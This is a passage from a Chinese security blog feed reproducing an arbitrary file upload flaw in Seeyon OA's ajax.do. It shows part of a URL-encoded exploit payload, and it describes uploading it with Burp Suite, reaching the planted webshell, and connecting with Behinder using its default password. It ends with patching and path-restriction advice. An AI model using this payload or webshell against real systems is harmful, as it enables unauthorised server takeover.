C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>使用burpsuite上传EXP，漏洞利用成功<br><img src="/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/2.png" alt="图片"><br>利用失败会返回如下：</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;
&quot;message&quot;:&quot;被迫下线，原因：与服务器失去连接&quot;,
&quot;code&quot;:&quot;-1&quot;,
&quot;details&quot;:null
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>请求webshell,证明上传成功<br><img src="/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/3.png" alt="图片"><br>使用冰蝎3进行连接，连接成功<br>Webshell地址:<a href="http://xxx.xxx.xxx.xxx/seeyon/SeeyonUpdate1.jspx">http://xxx.xxx.xxx.xxx/seeyon/SeeyonUpdate1.jspx</a><br>冰蝎3 默认马pass：rebeyond<br><img src="/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/4.png" alt="图片"><br><img src="/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/5.png" alt="图片"></p>
<p>冰蝎下载链接：<a href="https://github.com/rebeyond/Behinder/releases">https://github.com/rebeyond/Behinder/releases</a></p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>①联系致远OA官方以获取最新相关补丁，升级至最新版本。<br>②限制访问seeyon/thirdpartyController.do.css/..;/ajax.do</p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>2021.1</tag>
      </tags>
  </entry>
</search>
